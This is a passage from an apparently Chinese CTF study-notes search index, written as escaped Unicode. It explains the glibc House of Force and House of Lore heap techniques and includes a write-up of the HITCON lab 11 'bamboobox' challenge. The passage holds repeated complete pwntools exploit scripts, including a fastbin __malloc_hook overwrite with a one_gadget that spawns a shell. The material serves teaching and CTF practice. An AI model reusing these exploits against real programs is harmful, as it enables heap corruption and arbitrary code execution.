\u79fb\u52a8\u76f8\u5e94\u8ddd\u79bb\u3002 \u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u7533\u8bf7\u7279\u5b9a\u5927\u5c0f chunk \uff0c\u5c06 topchunk \u79fb\u52a8\u5230\u76ee\u6807\u5730\u5740\uff0c\u518d\u6b21\u7533\u8bf7\u5806\u5c31\u4f1a\u5206\u914d\u5230\u76ee\u6807\u5730\u5740\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u64cd\u4f5c\u3002\u5b9e\u73b0\u7684\u5173\u952e\u5c31\u662f\u7ed5\u8fc7 topchunk size \u68c0\u67e5\uff0c\u7ed5\u8fc7\u65b9\u6cd5\u5c31\u662f\u5c06 size \u8986\u76d6\u4e3a -1\uff080xffffffffffffffff\uff09\uff0c\u8ba9 size \u53d8\u6210\u6700\u5927\uff08malloc \u4f1a\u5f3a\u5236\u8f6c\u6362\u4e3a unsigned int\uff09\uff0c\u4e00\u822c\u60c5\u51b5\u90fd\u80fd\u6ee1\u8db3 size check \u8981\u6c42\u3002 topchunk \u53ef\u4ee5\u6709\u4e24\u4e2a\u79fb\u52a8\u65b9\u5411\uff1a malloc(\u8d1f\u6570)\uff0c\u5c06 topchunk \u5f80\u4f4e\u5730\u5740\u79fb malloc(\u6b63\u6570)\uff0c\u5c06 topchunk \u5f80\u9ad8\u5730\u5740\u79fb","title":"\u539f\u7406"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#_2","text":"\u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df \u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f \u5b9e\u73b0\u6548\u679c\uff1a\u4efb\u610f\u5730\u5740\u8bfb\u5199","title":"\u4f7f\u7528\u6761\u4ef6"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#_3","text":"\u73b0\u5728\u5730\u5740\uff1atopchunk \u73b0\u5728\u6307\u5411\u7684\u5730\u5740 \u76ee\u6807\u5730\u5740\uff1a\u5f80\u54ea\u91cc\u5199\u5165\u7684\u5730\u5740 \u5f80\u4f4e\u5730\u5740\u79fb\uff08\u8d1f\u6570\uff09\uff1a \u504f\u79fb=\u73b0\u5728\u5730\u5740-\u76ee\u6807\u5730\u5740-0x20 \u5f80\u9ad8\u5730\u5740\u79fb\uff08\u6b63\u6570\uff09\uff1a \u504f\u79fb=\u76ee\u6807\u5730\u5740-\u73b0\u5728\u5730\u5740","title":"\u8ba1\u7b97\u504f\u79fb"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#_4","text":"","title":"\u4f8b\u9898"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#hitcon-training-lab-11","text":"","title":"HITCON training lab 11"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#_5","text":"\u7528 chunk_ptr \u548c chunk_size \u4e24\u4e2a\u5217\u8868\u7ef4\u62a4\uff0c\u57fa\u4e8e\u4e0b\u6807\u64cd\u4f5c\u5806\u5757\u3002\u589e\u5220\u67e5\u6539\u529f\u80fd\u90fd\u6709\u3002","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#_6","text":"\u4fee\u6539\u51fd\u6570\u8981\u6c42\u8f93\u5165\u4fee\u6539\u957f\u5ea6\uff0c\u5bf9\u8be5\u957f\u5ea6\u6ca1\u6709\u9650\u5236\uff0c\u9020\u6210\u5806\u6ea2\u51fa\uff1a printf ( \"Please enter the length of item name:\" , & buf ); read ( 0 , & v4 , 8uLL ); length = atoi ( & v4 ); printf ( \"Please enter the new name of the item:\" , & v4 ); //\u76f4\u63a5\u5199\u5165\uff0c\u6ca1\u6709\u5bf9size\u8fdb\u884c\u68c0\u67e5 * ( _BYTE * )( chunk_ptr_list [ 2 * v2 ] + ( signed int ) read ( 0 , ( void * ) chunk_ptr_list [ 2 * v2 ], length )) = 0 ;","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#_7","text":"fastbin \u653b\u51fb malloc_hook \u65b9\u6cd5\u548c\u6b63\u5e38\u5957\u8def\u6d41\u7a0b\u5dee\u4e0d\u591a\uff0c\u6700\u540e\u8d34 exp \u3002 house of force \u4f7f\u7528\u6761\u4ef6\u90fd\u6ee1\u8db3\uff0c\u5148\u660e\u786e\u5c06 topchunk \u5411\u4e0a\u8c03\u591a\u5c11\u3002\u7533\u8bf7\u597d\u7b49\u7b49\u7528\u6765\u6ea2\u51fa\u4fee\u6539 topchunk size \u7684 chunk \u4e4b\u540e\uff0cgdb \u8c03\u8bd5\u3002 \u8fd9\u91cc\u5c31\u76f4\u63a5\u5c06\u5806\u7533\u8bf7\u8986\u76d6\u6574\u4e2a\u7b2c\u4e00\u4e2a\u5806\u5757\uff0c\u8ddd\u79bb\u8ba1\u7b97\uff1a #(0x603010-0x603090)-0x20=-0xa0 add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) \u540e\u9762\u5c31\u7533\u8bf7\u4e00\u4e2a\u5806\uff0c\u5199\u5165\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u4efb\u610f\u5730\u5740\u5199\u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#exp","text":"house of force from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./bamboobox\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) elf = ELF ( \"./bamboobox\" ) # p = remote(\"node3.buuoj.cn\",29945) # libc = ELF(\"./libc-2.23.so\") def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x68 , 'a' ) payload = 'a' * 0x68 + p64 ( 0xffffffffffffffff ) edit ( 0 , len ( payload ), payload ) add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) p . recvuntil ( ':' ) p . sendline ( '5' ) # gdb.attach(p) p . interactive () fastbin attack from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./bamboobox\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") elf = ELF ( \"./bamboobox\" ) p = remote ( \"node3.buuoj.cn\" , 29945 ) libc = ELF ( \"./libc-2.23.so\" ) def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x100 , 'top' ) add ( 0x68 , 'overloping' ) #1 add ( 0x400 - 0x10 , 'end' ) add ( 0x68 , '/bin/sh \\x00 protect' ) #3 remove ( 0 ) payload = 'a' * 0x60 + p64 ( 0X180 ) #+'\\x00' edit ( 1 , len ( payload ), payload ) remove ( 2 ) add ( 0x100 , 'top' ) show () p . recvuntil ( \"1 : \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) libc_base = leak_addr - 0x3c4b78 log . info ( \"libc_base:\" + hex ( libc_base )) malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] add ( 0x68 , 'skye' ) #2 remove ( 2 ) edit ( 1 , len ( p64 ( malloc_hook - 27 - 8 )), p64 ( malloc_hook - 27 - 8 )) add ( 0x68 , 'skye' ) ''' 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' onegadget = libc_base + 0x4526a #0x4527a add ( 0x68 , 'a' * 11 + p64 ( onegadget ) + p64 ( realloc )) # gdb.attach(p) p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( 'name:' ) p . sendline ( str ( 0x68 )) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/House/House_Of_Force/hitcontraning_lab11/writeup/","text":"hitcontraining_bamboobox \u00b6 \u9898\u76ee\u89e3\u6cd5\u6bd4\u8f83\u591a\uff0c\u53ef\u4ee5 fastbin \u6539 malloc_hook \u642d\u914d realloc \u8fd0\u884c onegadget \uff1bhouse of force \u5411\u4e0a\u62ac topchunk \u6539 goodbye \u51fd\u6570\u5730\u5740\uff1bhouse of force \u5411\u4e0b\u538b topchunk \u6539 malloc_hook \u3002 \u57fa\u672c\u60c5\u51b5 \u00b6 \u7528 chunk_ptr \u548c chunk_size \u4e24\u4e2a\u5217\u8868\u7ef4\u62a4\uff0c\u57fa\u4e8e\u4e0b\u6807\u64cd\u4f5c\u5806\u5757\u3002\u589e\u5220\u67e5\u6539\u529f\u80fd\u90fd\u6709\u3002 \u6f0f\u6d1e \u00b6 \u4fee\u6539\u51fd\u6570\u8981\u6c42\u8f93\u5165\u4fee\u6539\u957f\u5ea6\uff0c\u5bf9\u8be5\u957f\u5ea6\u6ca1\u6709\u9650\u5236\uff0c\u9020\u6210\u5806\u6ea2\u51fa\uff1a printf ( \"Please enter the length of item name:\" , & buf ); read ( 0 , & v4 , 8uLL ); length = atoi ( & v4 ); printf ( \"Please enter the new name of the item:\" , & v4 ); //\u76f4\u63a5\u5199\u5165\uff0c\u6ca1\u6709\u5bf9size\u8fdb\u884c\u68c0\u67e5 * ( _BYTE * )( chunk_ptr_list [ 2 * v2 ] + ( signed int ) read ( 0 , ( void * ) chunk_ptr_list [ 2 * v2 ], length )) = 0 ; \u601d\u8def \u00b6 fastbin \u653b\u51fb malloc_hook \u65b9\u6cd5\u548c\u6b63\u5e38\u5957\u8def\u6d41\u7a0b\u5dee\u4e0d\u591a\uff0c\u6700\u540e\u8d34 exp \u3002 house of force \u4f7f\u7528\u6761\u4ef6\u90fd\u6ee1\u8db3\uff0c\u5148\u660e\u786e\u5c06 topchunk \u5411\u4e0a\u8c03\u591a\u5c11\u3002\u7533\u8bf7\u597d\u7b49\u7b49\u7528\u6765\u6ea2\u51fa\u4fee\u6539 topchunk size \u7684 chunk \u4e4b\u540e\uff0cgdb \u8c03\u8bd5\u3002 \u8fd9\u91cc\u5c31\u76f4\u63a5\u5c06\u5806\u7533\u8bf7\u8986\u76d6\u6574\u4e2a\u7b2c\u4e00\u4e2a\u5806\u5757\uff0c\u8ddd\u79bb\u8ba1\u7b97\uff1a #(0x603000-0x603090)-0x10=-0xa0 add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) \u540e\u9762\u5c31\u7533\u8bf7\u4e00\u4e2a\u5806\uff0c\u5199\u5165\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u4efb\u610f\u5730\u5740\u5199\u3002 EXP \u00b6 house of force from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./bamboobox\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) elf = ELF ( \"./bamboobox\" ) # p = remote(\"node3.buuoj.cn\",29945) # libc = ELF(\"./libc-2.23.so\") def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x68 , 'a' ) payload = 'a' * 0x68 + p64 ( 0xffffffffffffffff ) edit ( 0 , len ( payload ), payload ) add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) p . recvuntil ( ':' ) p . sendline ( '5' ) # gdb.attach(p) p . interactive () fastbin attack from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./bamboobox\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") elf = ELF ( \"./bamboobox\" ) p = remote ( \"node3.buuoj.cn\" , 29945 ) libc = ELF ( \"./libc-2.23.so\" ) def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x100 , 'top' ) add ( 0x68 , 'overloping' ) #1 add ( 0x400 - 0x10 , 'end' ) add ( 0x68 , '/bin/sh \\x00 protect' ) #3 remove ( 0 ) payload = 'a' * 0x60 + p64 ( 0X180 ) #+'\\x00' edit ( 1 , len ( payload ), payload ) remove ( 2 ) add ( 0x100 , 'top' ) show () p . recvuntil ( \"1 : \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) libc_base = leak_addr - 0x3c4b78 log . info ( \"libc_base:\" + hex ( libc_base )) malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] add ( 0x68 , 'skye' ) #2 remove ( 2 ) edit ( 1 , len ( p64 ( malloc_hook - 27 - 8 )), p64 ( malloc_hook - 27 - 8 )) add ( 0x68 , 'skye' ) ''' 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' onegadget = libc_base + 0x4526a #0x4527a add ( 0x68 , 'a' * 11 + p64 ( onegadget ) + p64 ( realloc )) # gdb.attach(p) p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( 'name:' ) p . sendline ( str ( 0x68 )) p . interactive ()","title":"Writeup"},{"location":"Pwn/glibc-heap/House/House_Of_Force/hitcontraning_lab11/writeup/#hitcontraining_bamboobox","text":"\u9898\u76ee\u89e3\u6cd5\u6bd4\u8f83\u591a\uff0c\u53ef\u4ee5 fastbin \u6539 malloc_hook \u642d\u914d realloc \u8fd0\u884c onegadget \uff1bhouse of force \u5411\u4e0a\u62ac topchunk \u6539 goodbye \u51fd\u6570\u5730\u5740\uff1bhouse of force \u5411\u4e0b\u538b topchunk \u6539 malloc_hook \u3002","title":"hitcontraining_bamboobox"},{"location":"Pwn/glibc-heap/House/House_Of_Force/hitcontraning_lab11/writeup/#_1","text":"\u7528 chunk_ptr \u548c chunk_size \u4e24\u4e2a\u5217\u8868\u7ef4\u62a4\uff0c\u57fa\u4e8e\u4e0b\u6807\u64cd\u4f5c\u5806\u5757\u3002\u589e\u5220\u67e5\u6539\u529f\u80fd\u90fd\u6709\u3002","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/House/House_Of_Force/hitcontraning_lab11/writeup/#_2","text":"\u4fee\u6539\u51fd\u6570\u8981\u6c42\u8f93\u5165\u4fee\u6539\u957f\u5ea6\uff0c\u5bf9\u8be5\u957f\u5ea6\u6ca1\u6709\u9650\u5236\uff0c\u9020\u6210\u5806\u6ea2\u51fa\uff1a printf ( \"Please enter the length of item name:\" , & buf ); read ( 0 , & v4 , 8uLL ); length = atoi ( & v4 ); printf ( \"Please enter the new name of the item:\" , & v4 ); //\u76f4\u63a5\u5199\u5165\uff0c\u6ca1\u6709\u5bf9size\u8fdb\u884c\u68c0\u67e5 * ( _BYTE * )( chunk_ptr_list [ 2 * v2 ] + ( signed int ) read ( 0 , ( void * ) chunk_ptr_list [ 2 * v2 ], length )) = 0 ;","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/House/House_Of_Force/hitcontraning_lab11/writeup/#_3","text":"fastbin \u653b\u51fb malloc_hook \u65b9\u6cd5\u548c\u6b63\u5e38\u5957\u8def\u6d41\u7a0b\u5dee\u4e0d\u591a\uff0c\u6700\u540e\u8d34 exp \u3002 house of force \u4f7f\u7528\u6761\u4ef6\u90fd\u6ee1\u8db3\uff0c\u5148\u660e\u786e\u5c06 topchunk \u5411\u4e0a\u8c03\u591a\u5c11\u3002\u7533\u8bf7\u597d\u7b49\u7b49\u7528\u6765\u6ea2\u51fa\u4fee\u6539 topchunk size \u7684 chunk \u4e4b\u540e\uff0cgdb \u8c03\u8bd5\u3002 \u8fd9\u91cc\u5c31\u76f4\u63a5\u5c06\u5806\u7533\u8bf7\u8986\u76d6\u6574\u4e2a\u7b2c\u4e00\u4e2a\u5806\u5757\uff0c\u8ddd\u79bb\u8ba1\u7b97\uff1a #(0x603000-0x603090)-0x10=-0xa0 add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) \u540e\u9762\u5c31\u7533\u8bf7\u4e00\u4e2a\u5806\uff0c\u5199\u5165\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u4efb\u610f\u5730\u5740\u5199\u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/House/House_Of_Force/hitcontraning_lab11/writeup/#exp","text":"house of force from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./bamboobox\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) elf = ELF ( \"./bamboobox\" ) # p = remote(\"node3.buuoj.cn\",29945) # libc = ELF(\"./libc-2.23.so\") def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x68 , 'a' ) payload = 'a' * 0x68 + p64 ( 0xffffffffffffffff ) edit ( 0 , len ( payload ), payload ) add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) p . recvuntil ( ':' ) p . sendline ( '5' ) # gdb.attach(p) p . interactive () fastbin attack from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./bamboobox\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") elf = ELF ( \"./bamboobox\" ) p = remote ( \"node3.buuoj.cn\" , 29945 ) libc = ELF ( \"./libc-2.23.so\" ) def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x100 , 'top' ) add ( 0x68 , 'overloping' ) #1 add ( 0x400 - 0x10 , 'end' ) add ( 0x68 , '/bin/sh \\x00 protect' ) #3 remove ( 0 ) payload = 'a' * 0x60 + p64 ( 0X180 ) #+'\\x00' edit ( 1 , len ( payload ), payload ) remove ( 2 ) add ( 0x100 , 'top' ) show () p . recvuntil ( \"1 : \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) libc_base = leak_addr - 0x3c4b78 log . info ( \"libc_base:\" + hex ( libc_base )) malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] add ( 0x68 , 'skye' ) #2 remove ( 2 ) edit ( 1 , len ( p64 ( malloc_hook - 27 - 8 )), p64 ( malloc_hook - 27 - 8 )) add ( 0x68 , 'skye' ) ''' 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' onegadget = libc_base + 0x4526a #0x4527a add ( 0x68 , 'a' * 11 + p64 ( onegadget ) + p64 ( realloc )) # gdb.attach(p) p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( 'name:' ) p . sendline ( str ( 0x68 )) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/House/House_of_Lore/House_of_Lore/","text":"House of Lore \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 smallbin \u662f\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u6b21 malloc \u53d6\u51fa\u94fe\u8868\u6700\u540e\u6700\u540e\u4e00\u4e2a\u5806\u5757\uff0c\u8fdb\u884c unlink \u53d6\u51fa\u3002house of lore \u76ee\u6807\u662f\u63a7\u5236 smallbin \u7684 bk \u6307\u9488\uff0c\u53ca fake_chunk bk \u6307\u9488\uff0c\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u5730\u5740\u7684\u5806\u3002 \u539f\u7406\u5206\u6790 \u00b6 malloc \u7533\u8bf7\u5806\u5757\u8fdb\u5165\u5230 smallbin \u5224\u65ad\u51fd\u6570\u65f6\uff1a //glibc/malloc/malloc.c /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684 fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck->fd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002\u5173\u952e\u4ee3\u7801\uff1a // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ;","title":"House_of_Lore"},{"location":"Pwn/glibc-heap/House/House_of_Lore/House_of_Lore/#house-of-lore","text":"","title":"House of Lore"},{"location":"Pwn/glibc-heap/House/House_of_Lore/House_of_Lore/#_1","text":"smallbin \u662f\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u6b21 malloc \u53d6\u51fa\u94fe\u8868\u6700\u540e\u6700\u540e\u4e00\u4e2a\u5806\u5757\uff0c\u8fdb\u884c unlink \u53d6\u51fa\u3002house of lore \u76ee\u6807\u662f\u63a7\u5236 smallbin \u7684 bk \u6307\u9488\uff0c\u53ca fake_chunk bk \u6307\u9488\uff0c\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u5730\u5740\u7684\u5806\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Pwn/glibc-heap/House/House_of_Lore/House_of_Lore/#_2","text":"malloc \u7533\u8bf7\u5806\u5757\u8fdb\u5165\u5230 smallbin \u5224\u65ad\u51fd\u6570\u65f6\uff1a //glibc/malloc/malloc.c /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // 